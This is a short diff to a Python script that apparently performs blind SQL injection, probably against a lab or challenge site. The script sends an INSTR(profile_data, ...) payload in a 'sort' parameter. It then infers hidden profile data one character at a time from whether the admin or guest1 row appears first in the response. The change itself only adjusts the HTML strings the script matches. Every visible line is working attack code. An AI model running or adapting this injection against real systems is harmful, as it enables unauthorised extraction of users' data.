@@ -24,8 +24,8 @@ while True:
         payload = f"INSTR(profile_data, '{test_str}')"
         r = requests.get(f"{BASE_URL}/", params={"sort": payload})
         
-        idx_admin = r.text.find("<td>admin</td>")
-        idx_guest1 = r.text.find("<td>guest1</td>")
+        idx_admin = r.text.find(">admin</td>")
+        idx_guest1 = r.text.find(">guest1</td>")
         if char == 'w':
             print(f"DEBUG for 'w': admin index={idx_admin}, guest1 index={idx_guest1}")
         
